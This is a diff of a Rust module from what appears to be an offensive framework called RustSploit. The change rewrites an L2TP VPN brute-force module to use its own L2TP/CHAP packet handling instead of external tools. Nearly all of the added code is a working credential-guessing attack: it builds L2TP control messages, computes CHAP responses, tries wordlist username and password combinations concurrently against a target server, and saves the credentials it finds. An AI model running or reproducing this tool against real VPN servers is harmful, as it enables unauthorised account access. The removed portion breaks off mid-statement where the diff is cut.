@@ -1,78 +1,316 @@
 use anyhow::{anyhow, Result};
 use colored::*;
 use futures::stream::{FuturesUnordered, StreamExt};
-
 use std::{
     fs::File,
     io::Write,
-    path::{Path, PathBuf},
+    net::UdpSocket,
     sync::Arc,
     sync::atomic::{AtomicBool, Ordering},
     time::Duration,
 };
-use tokio::process::Command;
 use tokio::sync::{Mutex, Semaphore};
-use tokio::time::{sleep, timeout};
+use tokio::time::sleep;
 
 use crate::utils::{
     prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range,
-    load_lines, normalize_target,
+    load_lines, normalize_target, get_filename_in_current_dir, prompt_port,
 };
 use crate::modules::creds::utils::BruteforceStats;
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
+const DEFAULT_TIMEOUT_MS: u64 = 5000;
+
+// L2TP Message Types
+const L2TP_SCCRQ: u16 = 1;   // Start-Control-Connection-Request
+const L2TP_SCCRP: u16 = 2;   // Start-Control-Connection-Reply
+const L2TP_SCCCN: u16 = 3;   // Start-Control-Connection-Connected
+const L2TP_ICRQ: u16 = 10;   // Incoming-Call-Request
+const L2TP_ICRP: u16 = 11;   // Incoming-Call-Reply
+const L2TP_ICCN: u16 = 12;   // Incoming-Call-Connected
+
+// PPP Protocol IDs
+const PPP_CHAP: u16 = 0xC223;
+
+// CHAP Codes
+const CHAP_CHALLENGE: u8 = 1;
+const CHAP_RESPONSE: u8 = 2;
+const CHAP_SUCCESS: u8 = 3;
+const CHAP_FAILURE: u8 = 4;
 
 fn display_banner() {
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
-    println!("{}", "║   L2TP/IPsec VPN Brute Force Module                       ║".cyan());
-    println!("{}", "║   Supports: strongswan, xl2tpd, pppd, nmcli, rasdial     ║".cyan());
-    println!("{}", "║   ⚠️  Requires root/admin privileges for IPsec            ║".cyan());
+    println!("{}", "║   L2TP/PPP Brute Force Module                             ║".cyan());
+    println!("{}", "║   Native L2TP/CHAP Implementation                         ║".cyan());
+    println!("{}", "║   Tests against L2TP servers using CHAP authentication    ║".cyan());
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
     println!();
 }
 
+/// L2TP Session state
+struct L2tpSession {
+    sock: UdpSocket,
+    local_tunnel_id: u16,
+    remote_tunnel_id: u16,
+    local_session_id: u16,
+    remote_session_id: u16,
+    ns: u16,  // Next sequence to send
+    nr: u16,  // Next sequence expected
+}
+
+impl L2tpSession {
+    fn new(sock: UdpSocket) -> Self {
+        Self {
+            sock,
+            local_tunnel_id: rand::random::<u16>() | 1,
+            remote_tunnel_id: 0,
+            local_session_id: rand::random::<u16>() | 1,
+            remote_session_id: 0,
+            ns: 0,
+            nr: 0,
+        }
+    }
+    
+    /// Build L2TP control message
+    fn build_control(&mut self, avps: &[u8]) -> Vec<u8> {
+        // Flags: T=1 (control), L=1 (length), S=1 (sequence)
+        let flags: u16 = 0xC802;
+        let length = 12 + avps.len() as u16;
+        
+        let mut pkt = Vec::with_capacity(length as usize);
+        pkt.extend_from_slice(&flags.to_be_bytes());
+        pkt.extend_from_slice(&length.to_be_bytes());
+        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
+        pkt.extend_from_slice(&0u16.to_be_bytes()); // Session 0 for control
+        pkt.extend_from_slice(&self.ns.to_be_bytes());
+        pkt.extend_from_slice(&self.nr.to_be_bytes());
+        pkt.extend_from_slice(avps);
+        
+        self.ns = self.ns.wrapping_add(1);
+        pkt
+    }
+    
+    /// Build L2TP data message
+    fn build_data(&self, payload: &[u8]) -> Vec<u8> {
+        let flags: u16 = 0x0002; // Data message
+        
+        let mut pkt = Vec::with_capacity(6 + payload.len());
+        pkt.extend_from_slice(&flags.to_be_bytes());
+        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
+        pkt.extend_from_slice(&self.remote_session_id.to_be_bytes());
+        pkt.extend_from_slice(payload);
+        pkt
+    }
+    
+    /// Build AVP (Attribute-Value Pair)
+    fn build_avp(attr_type: u16, value: &[u8], mandatory: bool) -> Vec<u8> {
+        let flags = if mandatory { 0x8000 } else { 0 } | (6 + value.len() as u16);
+        let mut avp = Vec::with_capacity(6 + value.len());
+        avp.extend_from_slice(&flags.to_be_bytes());
+        avp.extend_from_slice(&0u16.to_be_bytes()); // Vendor ID = 0
+        avp.extend_from_slice(&attr_type.to_be_bytes());
+        avp.extend_from_slice(value);
+        avp
+    }
+    
+    /// Send SCCRQ (Start-Control-Connection-Request)
+    fn send_sccrq(&mut self) -> Result<()> {
+        let mut avps = Vec::new();
+        // Message Type = SCCRQ
+        avps.extend(Self::build_avp(0, &L2TP_SCCRQ.to_be_bytes(), true));
+        // Protocol Version = 1.0
+        avps.extend(Self::build_avp(2, &[0x01, 0x00], true));
+        // Host Name
+        avps.extend(Self::build_avp(3, b"RustSploit-L2TP", true));
+        // Assigned Tunnel ID
+        avps.extend(Self::build_avp(9, &self.local_tunnel_id.to_be_bytes(), true));
+        // Receive Window Size
+        avps.extend(Self::build_avp(10, &1500u16.to_be_bytes(), true));
+        
+        let pkt = self.build_control(&avps);
+        self.sock.send(&pkt)?;
+        Ok(())
+    }
+    
+    /// Send SCCCN (Start-Control-Connection-Connected)
+    fn send_scccn(&mut self) -> Result<()> {
+        let mut avps = Vec::new();
+        avps.extend(Self::build_avp(0, &L2TP_SCCCN.to_be_bytes(), true));
+        
+        let pkt = self.build_control(&avps);
+        self.sock.send(&pkt)?;
+        Ok(())
+    }
+    
+    /// Send ICRQ (Incoming-Call-Request)
+    fn send_icrq(&mut self) -> Result<()> {
+        let mut avps = Vec::new();
+        avps.extend(Self::build_avp(0, &L2TP_ICRQ.to_be_bytes(), true));
+        avps.extend(Self::build_avp(14, &self.local_session_id.to_be_bytes(), true));
+        avps.extend(Self::build_avp(15, &rand::random::<u32>().to_be_bytes(), true)); // Call Serial Number
+        
+        let pkt = self.build_control(&avps);
+        self.sock.send(&pkt)?;
+        Ok(())
+    }
+    
+    /// Send ICCN (Incoming-Call-Connected)
+    fn send_iccn(&mut self) -> Result<()> {
+        let mut avps = Vec::new();
+        avps.extend(Self::build_avp(0, &L2TP_ICCN.to_be_bytes(), true));
+        avps.extend(Self::build_avp(24, &1000000u32.to_be_bytes(), true)); // Tx Connect Speed
+        avps.extend(Self::build_avp(19, &0u32.to_be_bytes(), true)); // Framing Type
+        
+        let pkt = self.build_control(&avps);
+        self.sock.send(&pkt)?;
+        Ok(())
+    }
+    
+    /// Send CHAP Response
+    fn send_chap_response(&self, identifier: u8, challenge: &[u8], username: &str, password: &str) -> Result<()> {
+        // Compute CHAP hash: MD5(identifier + password + challenge)
+        let mut data = Vec::with_capacity(1 + password.len() + challenge.len());
+        data.push(identifier);
+        data.extend_from_slice(password.as_bytes());
+        data.extend_from_slice(challenge);
+        let hash = md5::compute(&data);
+        
+        // Build CHAP Response packet
+        let name_bytes = username.as_bytes();
+        let length: u16 = 4 + 1 + 16 + name_bytes.len() as u16;
+        
+        let mut chap = Vec::new();
+        chap.push(CHAP_RESPONSE);
+        chap.push(identifier);
+        chap.extend_from_slice(&length.to_be_bytes());
+        chap.push(16); // Value size (MD5 = 16 bytes)
+        chap.extend_from_slice(&hash.0);
+        chap.extend_from_slice(name_bytes);
+        
+        // Wrap in PPP frame
+        let mut ppp = Vec::new();
+        ppp.extend_from_slice(&[0xFF, 0x03]); // Address + Control
+        ppp.extend_from_slice(&PPP_CHAP.to_be_bytes());
+        ppp.extend_from_slice(&chap);
+        
+        let pkt = self.build_data(&ppp);
+        self.sock.send(&pkt)?;
+        Ok(())
+    }
+    
+    /// Receive and parse L2TP packet
+    fn recv_packet(&self, timeout: Duration) -> Result<L2tpPacket> {
+        self.sock.set_read_timeout(Some(timeout))?;
+        
+        let mut buf = [0u8; 4096];
+        let n = self.sock.recv(&mut buf)?;
+        
+        if n < 6 {
+            return Err(anyhow!("Packet too short"));
+        }
+        
+        let flags = u16::from_be_bytes([buf[0], buf[1]]);
+        let is_control = (flags & 0x8000) != 0;
+        let has_length = (flags & 0x4000) != 0;
+        let has_sequence = (flags & 0x0800) != 0;
+        
+        let mut offset = 2;
+        
+        if has_length {
+            offset += 2;
+        }
+        
+        let tunnel_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
+        offset += 2;
+        let session_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
+        offset += 2;
+        
+        if has_sequence {
+            offset += 4; // Ns + Nr
+        }
+        
+        let payload = buf[offset..n].to_vec();
+        
+        Ok(L2tpPacket {
+            is_control,
+            tunnel_id,
+            session_id,
+            payload,
+        })
+    }
+    
+    /// Parse control message type from AVPs
+    fn parse_message_type(payload: &[u8]) -> Option<u16> {
+        let mut offset = 0;
+        while offset + 6 <= payload.len() {
+            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
+            let avp_len = (avp_flags & 0x03FF) as usize;
+            
+            if offset + avp_len > payload.len() {
+                break;
+            }
+            
+            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
+            let attr_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);
+            
+            if vendor_id == 0 && attr_type == 0 && avp_len >= 8 {
+                return Some(u16::from_be_bytes([payload[offset + 6], payload[offset + 7]]));
+            }
+            
+            offset += avp_len;
+        }
+        None
+    }
+    
+    /// Parse assigned tunnel/session ID from AVPs
+    fn parse_assigned_id(payload: &[u8], attr_type: u16) -> Option<u16> {
+        let mut offset = 0;
+        while offset + 6 <= payload.len() {
+            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
+            let avp_len = (avp_flags & 0x03FF) as usize;
+            
+            if offset + avp_len > payload.len() {
+                break;
+            }
+            
+            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
+            let avp_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);
+            
+            if vendor_id == 0 && avp_type == attr_type && avp_len >= 8 {
+                return Some(u16::from_be_bytes([payload[offset + 6], payload[offset + 7]]));
+            }
+            
+            offset += avp_len;
+        }
+        None
+    }
+}
+
+#[allow(dead_code)]
+struct L2tpPacket {
+    is_control: bool,
+    tunnel_id: u16,
+    session_id: u16,
+    payload: Vec<u8>,
+}
+
+/// Main L2TP bruteforce entry point
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
     println!("{}", format!("[*] Target: {}", target).cyan());
 
-    // Pre-flight check: validate L2TP server is reachable
-    // We need to resolve the address for the IPsec check
-    let addr = normalize_target(target)?; 
-    let server_ip = addr.split(':').next().unwrap_or(&addr);
-
-    println!("[*] Testing L2TP server connectivity...");
-    if !test_l2tp_connectivity(server_ip, Duration::from_secs(5)).await? {
-        println!("{}", "[!] Warning: L2TP server does not appear to be responding. Continuing anyway...".yellow());
-    } else {
-        println!("[+] L2TP server is responding");
-    }
-
-    let port: u16 = prompt_default("L2TP/IPsec Port (IKE)", "500").await?
-        .parse().unwrap_or(500);
-
-    let usernames_file_path = prompt_wordlist("Username wordlist path").await?;
-    let passwords_file_path = prompt_wordlist("Password wordlist path").await?;
-
-    // Optional: Pre-shared key (PSK) for IPsec phase
-    let psk_str = prompt_default("IPsec Pre-shared Key (PSK) - optional, press Enter to skip", "").await?;
-    let psk = if psk_str.is_empty() { None } else { Some(psk_str) };
-
-    // Security warning for PSK
-    if let Some(ref psk_val) = psk {
-        if psk_val.len() < 8 {
-            println!("{}", "[!] Warning: PSK is very short. Consider using a longer, more secure key.".yellow());
-        }
-        if psk_val.chars().all(|c| c.is_alphanumeric()) && !psk_val.chars().any(|c| c.is_uppercase()) {
-            println!("{}", "[!] Warning: PSK contains only lowercase letters/numbers. Consider adding special characters.".yellow());
-        }
-    }
-
-    let concurrency = prompt_int_range("Max concurrent tasks", 5, 1, 10000).await? as usize;
-    let timeout_secs = prompt_int_range("Connection timeout (seconds)", 15, 1, 300).await? as u64;
-
+    let normalized = normalize_target(target)?;
+    let port: u16 = prompt_port("L2TP Port", 1701).await?;
+    
+    let usernames_file = prompt_wordlist("Username wordlist").await?;
+    let passwords_file = prompt_wordlist("Password wordlist").await?;
+    
+    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 100).await? as usize;
+    let timeout_ms = prompt_int_range("Connection timeout (ms)", DEFAULT_TIMEOUT_MS as i64, 100, 30000).await? as u64;
+    
     let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
-    let _save_results = prompt_yes_no("Save results to file?", true).await?;
-    let save_path = if _save_results {
+    let save_results = prompt_yes_no("Save results to file?", true).await?;
+    let save_path = if save_results {
         Some(prompt_default("Output file name", "l2tp_results.txt").await?)
     } else {
         None
@@ -80,122 +318,129 @@ pub async fn run(target: &str) -> Result<()> {
     let verbose = prompt_yes_no("Verbose mode?", false).await?;
     let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false).await?;
 
-    let normalized = normalize_target(target)?;
-    let addr = if (normalized.starts_with('[') && normalized.ends_with(']')) || (!normalized.contains(':')) {
-        format!("{}:{}", normalized, port)
-    } else {
-        normalized
+    let addr = format!("{}:{}", normalized, port);
+    
+    let users = load_lines(&usernames_file)?;
+    if users.is_empty() {
+        return Err(anyhow!("Username wordlist is empty"));
+    }
+    println!("[*] Loaded {} usernames", users.len());
+    
+    let passwords = load_lines(&passwords_file)?;
+    if passwords.is_empty() {
+        return Err(anyhow!("Password wordlist is empty"));
+    }
+    println!("[*] Loaded {} passwords", passwords.len());
+    
+    let total_attempts = if combo_mode { 
+        users.len() * passwords.len() 
+    } else { 
+        std::cmp::max(users.len(), passwords.len()) 
     };
+    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
+    
+    // Test connectivity first
+    println!("\n[*] Testing L2TP server connectivity...");
+    match test_l2tp_connectivity(&addr, Duration::from_millis(timeout_ms)).await {
+        Ok(true) => println!("[+] L2TP server is responding"),
+        Ok(false) => println!("{}", "[!] L2TP server not responding to control messages".yellow()),
+        Err(e) => println!("{}", format!("[!] Connectivity test failed: {}", e).yellow()),
+    }
+    
+    println!("\n{}", "[Starting Attack]".bold().yellow());
+    println!();
+    
     let found_credentials = Arc::new(Mutex::new(Vec::new()));
     let stop_signal = Arc::new(AtomicBool::new(false));
     let stats = Arc::new(BruteforceStats::new());
-
-    println!("\n[*] Starting brute-force on {}", addr);
-    println!("[*] Timeout: {} seconds", timeout_secs);
-    if psk.is_some() {
-        println!("[*] Using IPsec PSK authentication");
-    } else {
-        println!("[*] No PSK specified - attempting direct L2TP or tools without IPsec");
-    }
-
-    // Report available tools
-    println!("[*] Checking available L2TP tools...");
-    let tools = detect_available_tools().await;
-    if tools.is_empty() {
-        println!("{}", "[!] No L2TP tools detected. Module may not work properly.".yellow());
-    } else {
-        println!("[+] Available tools: {}", tools.join(", "));
-    }
-
-    let users = load_lines(&usernames_file_path)?;
-    if users.is_empty() {
-        println!("[!] Username wordlist is empty. Exiting.");
-        return Ok(());
-    }
-    println!("[*] Loaded {} usernames", users.len());
-
-    let passwords = load_lines(&passwords_file_path)?;
-    if passwords.is_empty() {
-        println!("[!] Password wordlist is empty. Exiting.");
-        return Ok(());
-    }
-    println!("[*] Loaded {} passwords", passwords.len());
-
-    let total_attempts = if combo_mode { users.len() * passwords.len() } else { std::cmp::max(users.len(), passwords.len()) };
-    println!("{}", format!("[*] Approximate attempts: {}", total_attempts).cyan());
-    println!();
-
+    let timeout_duration = Duration::from_millis(timeout_ms);
+    
     // Start progress reporter
     let stats_clone = stats.clone();
     let stop_clone = stop_signal.clone();
     let progress_handle = tokio::spawn(async move {
-        loop {
-            if stop_clone.load(Ordering::Relaxed) {
-                break;
-            }
-            stats_clone.print_progress();
+        while !stop_clone.load(Ordering::Relaxed) {
             sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
+            stats_clone.print_progress();
         }
     });
-
+    
     let semaphore = Arc::new(Semaphore::new(concurrency));
     let mut tasks = FuturesUnordered::new();
-    let timeout_duration = Duration::from_secs(timeout_secs);
-
-    // Setup cleanup handler for graceful shutdown
-    // This is hard to do cleanly in this structure as `tokio::signal` blocks. 
-    // We can spawn it but it might not be easy to interact with the main flow without cancellation token.
-    // The previous code had a cleanup_handle but it just did process::exit. This is fine for CLI tool.
-    let cleanup_handle = tokio::spawn(async move {
-        tokio::signal::ctrl_c().await.ok();
-        println!("\n[!] Received interrupt signal. Exiting (cleanup may be incomplete)...");
-        std::process::exit(130);
-    });
-    let _ = cleanup_handle;
-
-    // Work generation
-    if combo_mode {
-        for user in &users {
-            for pass in &passwords {
-                if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
-                spawn_l2tp_task(
-                    &mut tasks, &semaphore, 
-                    addr.clone(), user.clone(), pass.clone(), psk.clone(),
-                    found_credentials.clone(), stop_signal.clone(), stats.clone(),
-                    verbose, stop_on_success, timeout_duration
-                ).await;
-            }
-            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
-        }
+    
+    // Generate credential combinations
+    let combos: Vec<(String, String)> = if combo_mode {
+        users.iter()
+            .flat_map(|u| passwords.iter().map(move |p| (u.clone(), p.clone())))
+            .collect()
     } else {
         let max_len = std::cmp::max(users.len(), passwords.len());
-        for i in 0..max_len {
-            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
-            let user = &users[i % users.len()];
-            let pass = &passwords[i % passwords.len()];
-             spawn_l2tp_task(
-                &mut tasks, &semaphore, 
-                addr.clone(), user.clone(), pass.clone(), psk.clone(),
-                found_credentials.clone(), stop_signal.clone(), stats.clone(),
-                verbose, stop_on_success, timeout_duration
-            ).await;
+        (0..max_len)
+            .map(|i| (users[i % users.len()].clone(), passwords[i % passwords.len()].clone()))
+            .collect()
+    };
+    
+    for (user, pass) in combos {
+        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+            break;
+        }
+        
+        let permit = match semaphore.clone().acquire_owned().await {
+            Ok(p) => p,
+            Err(_) => break,
+        };
+        
+        let addr_clone = addr.clone();
+        let found_clone = found_credentials.clone();
+        let stop_clone = stop_signal.clone();
+        let stats_clone = stats.clone();
+        
+        tasks.push(tokio::spawn(async move {
+            let _permit = permit;
+            
+            if stop_on_success && stop_clone.load(Ordering::Relaxed) {
+                return;
+            }
+            
+            match try_l2tp_login(&addr_clone, &user, &pass, timeout_duration).await {
+                Ok(true) => {
+                    println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass).green().bold());
+                    found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass.clone()));
+                    stats_clone.record_success();
+                    if stop_on_success {
+                        stop_clone.store(true, Ordering::Relaxed);
+                    }
+                }
+                Ok(false) => {
+                    stats_clone.record_failure();
+                    if verbose {
+                        println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass).dimmed());
+                    }
+                }
+                Err(e) => {
+                    stats_clone.record_error(e.to_string()).await;
+                    if verbose {
+                        println!("\r{}", format!("[!] {}: {}", addr_clone, e).red());
+                    }
+                }
+            }
+        }));
+        
+        // Drain completed tasks periodically
+        while tasks.len() >= concurrency * 2 {
+            if let Some(_) = tasks.next().await {}
         }
     }
-
+    
     // Wait for remaining tasks
-    while let Some(res) = tasks.next().await {
-        if let Err(e) = res {
-             stats.record_error(format!("Task panic: {}", e)).await;
-        }
-    }
-
-    // Stop progress reporter
+    while let Some(_) = tasks.next().await {}
+    
     stop_signal.store(true, Ordering::Relaxed);
     let _ = progress_handle.await;
-
-    // Print final statistics
+    
     stats.print_final().await;
-
+    
+    // Save results
     let creds = found_credentials.lock().await;
     if creds.is_empty() {
         println!("{}", "[-] No credentials found.".yellow());
@@ -204,7 +449,7 @@ pub async fn run(target: &str) -> Result<()> {
         for (host_addr, user, pass) in creds.iter() {
             println!("    {} -> {}:{}", host_addr, user, pass);
         }
-
+        
         if let Some(path_str) = save_path {
             let filename = get_filename_in_current_dir(&path_str);
             if let Ok(mut file) = File::create(&filename) {
@@ -215,1208 +460,164 @@ pub async fn run(target: &str) -> Result<()> {
             }
         }
     }
-
+    
     Ok(())
 }
 
-async fn spawn_l2tp_task(
-    tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
-    semaphore: &Arc<Semaphore>,
-    addr: String,
-    user: String,
-    pass: String,
-    psk: Option<String>,
-    found: Arc<Mutex<Vec<(String, String, String)>>>,
-    stop_signal: Arc<AtomicBool>,
-    stats: Arc<BruteforceStats>,
-    verbose: bool,
-    stop_on_success: bool,
-    timeout: Duration
-) {
-    let permit = semaphore.clone().acquire_owned().await.ok();
-    if permit.is_none() { return; }
-
-    tasks.push(tokio::spawn(async move {
-        // Drop permit when done
-        let _permit = permit;
-        
-        if stop_on_success && stop_signal.load(Ordering::Relaxed) { return; }
-
-        match try_l2tp_login(&addr, &user, &pass, &psk, timeout).await {
-            Ok(true) => {
-                println!("\r{}", format!("[+] {} -> {}:{}", addr, user, pass).green().bold());
-                found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
-                stats.record_success();
-                if stop_on_success {
-                    stop_signal.store(true, Ordering::Relaxed);
+/// Test L2TP server connectivity
+async fn test_l2tp_connectivity(addr: &str, timeout: Duration) -> Result<bool> {
+    let result = tokio::task::spawn_blocking({
+        let addr = addr.to_string();
+        move || -> Result<bool> {
+            let sock = UdpSocket::bind("0.0.0.0:0")?;
+            sock.connect(&addr)?;
+            sock.set_read_timeout(Some(timeout))?;
+            sock.set_write_timeout(Some(timeout))?;
+            
+            let mut session = L2tpSession::new(sock);
+            session.send_sccrq()?;
+            
+            match session.recv_packet(timeout) {
+                Ok(pkt) => {
+                    if pkt.is_control {
+                        if let Some(msg_type) = L2tpSession::parse_message_type(&pkt.payload) {
+                            return Ok(msg_type == L2TP_SCCRP);
+                        }
+                    }
+                    Ok(false)
                 }
-            }
-            Ok(false) => {
-                stats.record_failure();
-                if verbose {
-                    println!("\r{}", format!("[-] {} -> {}:{}", addr, user, pass).dimmed());
-                }
-            }
-            Err(e) => {
-                stats.record_error(e.to_string()).await;
-                if verbose {
-                    println!("\r{}", format!("[!] {}: error: {}", addr, e).red());
-                }
+                Err(_) => Ok(false),
             }
         }
-        
-        // Rate limiting logic from original module (200ms sleep)
-        sleep(Duration::from_millis(200)).await;
-    }));
+    }).await?;
+    result
 }
 
-
-fn get_filename_in_current_dir(input: &str) -> PathBuf {
-    let name = Path::new(input)
-        .file_name()
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
-    PathBuf::from(format!("./{}", name))
-}
-/// Attempts L2TP/IPsec VPN login
-/// 
-/// Note: L2TP/IPsec authentication is complex and requires:
-/// - Root privileges for IPsec operations
-/// - Proper configuration files (/etc/ipsec.conf, /etc/ipsec.secrets, etc.)
-/// - IPsec phase (machine authentication with PSK/certificates)
-/// - L2TP phase (user authentication with username/password)
-/// 
-/// This implementation provides the framework. A full implementation would need to:
-/// - Create temporary configuration files dynamically
-/// - Use ipsec/strongswan commands to establish IPsec tunnel
-/// - Use xl2tpd or pppd to establish L2TP tunnel within IPsec
-/// - Parse connection status and authentication responses
-async fn try_l2tp_login(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // Try using strongswan (ipsec/strongswan) if available
-    let strongswan_check = Command::new("which")
-        .arg("ipsec")
-        .output()
-        .await;
+/// Attempt L2TP login with credentials
+async fn try_l2tp_login(addr: &str, username: &str, password: &str, timeout: Duration) -> Result<bool> {
+    let addr = addr.to_string();
+    let username = username.to_string();
+    let password = password.to_string();
     
-    if strongswan_check.is_ok() && strongswan_check.unwrap().status.success() {
-        return try_l2tp_strongswan(addr, username, password, psk, timeout_duration).await;
-    }
+    tokio::task::spawn_blocking(move || {
+        try_l2tp_login_sync(&addr, &username, &password, timeout)
+    }).await?
+}
 
-    // Fallback: try xl2tpd if available
-    let xl2tpd_check = Command::new("which")
-        .arg("xl2tpd")
-        .output()
-        .await;
+/// Synchronous L2TP login attempt
+fn try_l2tp_login_sync(addr: &str, username: &str, password: &str, timeout: Duration) -> Result<bool> {
+    let sock = UdpSocket::bind("0.0.0.0:0")?;
+    sock.connect(addr)?;
+    sock.set_read_timeout(Some(timeout))?;
+    sock.set_write_timeout(Some(timeout))?;
     
-    if xl2tpd_check.is_ok() && xl2tpd_check.unwrap().status.success() {
-        return try_l2tp_xl2tpd(addr, username, password, psk, timeout_duration).await;
+    let mut session = L2tpSession::new(sock);
+    
+    // Step 1: Send SCCRQ
+    session.send_sccrq()?;
+    
+    // Step 2: Receive SCCRP
+    let pkt = session.recv_packet(timeout)?;
+    if !pkt.is_control {
+        return Err(anyhow!("Expected control message, got data"));
     }
-
-    // Try using system L2TP tools
-    #[cfg(target_os = "windows")]
-    {
-        // Try Windows built-in rasdial for VPN connections
-        return try_l2tp_rasdial(addr, username, password, psk, timeout_duration).await;
-    }
-
-    #[cfg(target_os = "linux")]
-    {
-        // Try using pppd with l2tp plugin if available
-        let pppd_check = Command::new("which")
-            .arg("pppd")
-            .output()
-            .await;
-
-        if pppd_check.is_ok() && pppd_check.unwrap().status.success() {
-            return try_l2tp_pppd(addr, username, password, psk, timeout_duration).await;
-        }
-
-        // Try NetworkManager L2TP support
-        let nmcli_check = Command::new("which")
-            .arg("nmcli")
-            .output()
-            .await;
-
-        if nmcli_check.is_ok() && nmcli_check.unwrap().status.success() {
-            return try_l2tp_nmcli(addr, username, password, psk, timeout_duration).await;
-        }
-    }
-
-    #[cfg(target_os = "macos")]
-    {
-        // Try macOS built-in L2TP support
-        return try_l2tp_macos(addr, username, password, psk, timeout_duration).await;
-    }
-
-    // As a last resort, try direct L2TP connection
-    try_l2tp_fallback(addr, username, password, timeout_duration).await
-}
-
-async fn try_l2tp_strongswan(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // Extract IP address from addr (remove port if present)
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-
-    // Check if we have PSK for IPsec phase
-    if psk.is_none() {
-        return Err(anyhow!("L2TP/IPsec requires a Pre-shared Key (PSK) for IPsec phase"));
-    }
-    let psk_value = psk.as_ref().unwrap();
-
-    // Create unique connection name to avoid conflicts
-    let conn_name = format!("l2tp_brute_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    // Use swanctl (modern strongswan) if available, fallback to ipsec command
-    let use_swanctl = Command::new("which")
-        .arg("swanctl")
-        .output()
-        .await
-        .map(|out| out.status.success())
-        .unwrap_or(false);
-
-    if use_swanctl {
-        try_l2tp_swanctl(&server_ip, username, password, psk_value, &conn_name, timeout_duration).await
-    } else {
-        try_l2tp_ipsec_command(&server_ip, username, password, psk_value, &conn_name, timeout_duration).await
-    }
-}
-
-async fn try_l2tp_swanctl(server_ip: &str, username: &str, password: &str, psk: &str, conn_name: &str, timeout_duration: Duration) -> Result<bool> {
-    // Create temporary swanctl config files
-    let temp_dir = std::env::temp_dir();
-    let swan_dir = temp_dir.join(format!("swanctl_{}", conn_name));
-    std::fs::create_dir_all(&swan_dir)?;
-
-    let connection_conf = format!(
-        r#"{{
-    connections: {{
-        {}: {{
-            local_addrs: ["%any"],
-            remote_addrs: ["{}"],
-            version: 1,
-            proposals: ["aes128-sha1-modp1024"],
-            local: {{
-                auth: psk
-            }},
-            remote: {{
-                auth: psk
-            }},
-            children: {{
-                {}: {{
-                    local_ts: ["0.0.0.0/0"],
-                    remote_ts: ["0.0.0.0/0"],
-                    esp_proposals: ["aes128-sha1"],
-                    mode: transport,
-                    protocols: [17]  // UDP
-                }}
-            }}
-        }}
-    }},
-    secrets: {{
-        ike-{}: {{
-            secret: "{}"
-        }}
-    }}
-}}"#,
-        conn_name, server_ip, conn_name, conn_name, psk
-    );
-
-    let conf_path = swan_dir.join("connections.conf");
-    std::fs::write(&conf_path, connection_conf)
-        .map_err(|e| anyhow!("Failed to write swanctl config: {}", e))?;
-
-    // Load configuration
-    let load_result = Command::new("swanctl")
-        .args(["--load-conns", "--file", &conf_path.to_string_lossy()])
-        .output()
-        .await;
-
-    if !load_result.map(|out| out.status.success()).unwrap_or(false) {
-        let _ = std::fs::remove_dir_all(&swan_dir);
-        return Ok(false); // Configuration failed, likely invalid PSK or server config
-    }
-
-    // Initiate connection
-    let init_result = Command::new("swanctl")
-        .args(["-i", conn_name])
-        .output()
-        .await;
-
-    if !init_result.map(|out| out.status.success()).unwrap_or(false) {
-        let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
-        let _ = std::fs::remove_dir_all(&swan_dir);
-        return Ok(false);
-    }
-
-    // Wait for connection establishment
-    sleep(Duration::from_secs(2)).await;
-
-    // Check if IKE_SA is established
-    let status_result = Command::new("swanctl")
-        .args(["-l", "--ike", conn_name])
-        .output()
-        .await;
-
-    let connected = if let Ok(output) = status_result {
-        let stdout = String::from_utf8_lossy(&output.stdout);
-        stdout.contains("ESTABLISHED")
-    } else {
-        false
-    };
-
-    if !connected {
-        let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
-        let _ = std::fs::remove_dir_all(&swan_dir);
-        return Ok(false);
-    }
-
-    // Now try L2TP within the IPsec tunnel
-    let l2tp_result = try_l2tp_over_ipsec(server_ip, username, password, timeout_duration).await;
-
-    // Clean up
-    let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
-    let _ = std::fs::remove_dir_all(&swan_dir);
-
-    l2tp_result
-}
-
-async fn try_l2tp_ipsec_command(server_ip: &str, username: &str, password: &str, psk: &str, conn_name: &str, timeout_duration: Duration) -> Result<bool> {
-    // Fallback to legacy ipsec command
-    // Create temporary config files
-    let temp_dir = std::env::temp_dir();
-    let ipsec_conf_path = temp_dir.join(format!("{}.conf", conn_name));
-    let ipsec_secrets_path = temp_dir.join(format!("{}.secrets", conn_name));
-
-    // Build IPsec configuration
-    let ipsec_conf = format!(
